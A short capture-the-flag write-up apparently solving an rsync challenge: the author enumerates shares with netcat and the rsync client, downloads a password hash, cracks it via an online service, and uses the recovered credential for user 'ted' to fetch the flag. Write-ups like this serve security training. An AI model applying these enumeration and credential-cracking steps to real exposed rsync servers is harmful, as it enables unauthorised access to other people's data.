# Sharing WriteUp

I started by using netcat to connect to the service.
```bash
nc challenges.ctf.sikt.no 5009
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
```

Reading up on rsync I learned that I could just resend the same banner and then #list.

```bash
$ nc challenges.ctf.sikt.no 5009
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
#list
open           	Open share
protected      	Protected share
@RSYNCD: EXIT
```

Hmm, a open and a protected share. Lets see what the open one contains. This time using the rsync client.

```bash
$ rsync -av --list-only rsync://challenges.ctf.sikt.no:5009/open
receiving file list ... done
drwxr-xr-x        4096 2024/10/04 14:44:06 .
-rw-rw-r--         128 2024/09/03 12:23:47 password_hash.txt
-rw-rw-r--           3 2024/10/04 14:42:37 users

sent 16 bytes  received 130 bytes  58.40 bytes/sec
total size is 131  speedup is 0.90
```

Nice, a password_hash file and a users file. Using another flag with the rsync client, I downloaded the files to the
current (.) folder. `rsync -avz rsync://challenges.ctf.sikt.no:5009/open .`

I found this site (https://hashes.com/en/decrypt/hash) which cracked the hash. The users file also contained a name, ted.

Now for the protected share.
```bash
$ rsync -av --list-only rsync://ted@challenges.ctf.sikt.no:5009/protected
Password: <passord for ted>
receiving file list ... done
dr-xr-xr-x        4096 2024/10/04 14:44:05 .
-r-xr-xr-x          26 2024/09/03 12:23:47 flag.txt

sent 16 bytes  received 98 bytes  25.33 bytes/sec
total size is 26  speedup is 0.23
```

Running rsync with -avz on the protected folder allowed me to download the flag.

